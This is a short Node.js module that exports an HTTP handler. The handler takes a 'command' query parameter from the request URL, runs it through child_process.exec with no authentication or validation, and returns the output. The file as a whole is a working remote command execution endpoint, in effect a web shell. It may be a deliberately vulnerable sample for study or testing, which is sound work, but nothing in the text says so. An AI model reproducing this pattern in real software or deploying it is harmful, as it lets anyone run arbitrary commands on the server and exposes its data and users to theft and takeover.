const { exec } = require('node:child_process');

function handler(request, response) {
  const command = new URL(request.url, 'http://localhost').searchParams.get('command');
  exec(command, (error, stdout) => {
    response.end(stdout);
  });
}

module.exports = { handler };
